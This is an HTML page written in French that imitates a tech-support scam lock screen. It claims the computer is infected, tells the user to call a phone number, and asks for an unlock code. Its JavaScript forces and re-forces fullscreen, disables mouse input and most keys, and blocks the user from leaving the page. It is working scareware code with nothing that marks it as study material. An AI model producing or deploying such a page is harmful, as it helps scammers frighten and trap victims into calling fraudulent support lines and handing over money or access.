<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alerte Système</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none; /* Empêche la sélection de texte */
        }
        html, body {
            width: 100vw;
            height: 100vh;
            background: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            height: 100%;
            padding: 5%;
        }
        .message {
            font-size: 5vw;
            font-weight: bold;
            text-align: center;
            width: 90%;
        }
        .alert-number {
            font-size: 4vw;
            font-weight: bold;
            color: red;
        }
        #codeInput {
            margin-top: 20px;
            padding: 15px;
            font-size: 3vw;
            text-align: center;
            border: 3px solid white;
            width: 50%;
            background: black;
            color: white;
            ime-mode: disabled;
        }
        #error-message {
            color: red;
            font-size: 2vw;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="container">
        <p class="message">⚠️ Votre ordinateur est infecté ⚠️<br>Appelez immédiatement :</p>
        <p class="alert-number">+33 6 XX XX XX XX</p>
        <p style="font-size: 3vw;">Entrez le code de déverrouillage :</p>
        <input type="password" id="codeInput" placeholder="Code secret">
        <p id="error-message"></p>
    </div>

    <audio id="keypress-sound">
        <source src="https://www.soundjay.com/button/beep-07.wav" type="audio/wav">
    </audio>

    <script>
        // Ouvrir en plein écran immédiatement
        function openFullscreen() {
            let elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.mozRequestFullScreen) { 
                elem.mozRequestFullScreen();
            } else if (elem.webkitRequestFullscreen) { 
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) { 
                elem.msRequestFullscreen();
            }
        }
        openFullscreen();

        // Désactiver la souris, le clic droit et la sélection de texte
        document.addEventListener("contextmenu", event => event.preventDefault());
        document.addEventListener("mousedown", event => event.preventDefault());
        document.addEventListener("mouseup", event => event.preventDefault());
        document.addEventListener("mousemove", event => event.preventDefault());

        // Désactiver toutes les touches sauf le pavé numérique
        document.addEventListener("keydown", function(event) {
            let allowedKeys = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "Enter", "Backspace"];
            if (!allowedKeys.includes(event.key)) {
                event.preventDefault();
            }
        });

        // Empêcher de quitter la page
        window.onbeforeunload = function() {
            return "Votre ordinateur est bloqué, vous ne pouvez pas quitter cette page !";
        };

        // Vérifier si la fenêtre est réduite ou fermée (forcer le plein écran)
        setInterval(() => {
            if (document.hidden) {
                openFullscreen();
            }
        }, 500);

        // Ajouter un son à chaque touche pressée
        document.getElementById("codeInput").addEventListener("keydown", function(event) {
            document.getElementById("keypress-sound").play();
        });

        // Vérifier le code secret
        document.getElementById("codeInput").addEventListener("keyup", function(event) {
            if (event.key === "Enter") {
                if (this.value === "1234") {  
                    document.body.innerHTML = "<h1 style='color: white; text-align: center; margin-top: 20%; font-size: 5vw;'>✅ Système restauré</h1>";
                } else {
                    document.getElementById("error-message").innerText = "Code incorrect !";
                    this.value = "";
                }
            }
        });
    </script>

</body>
</html>
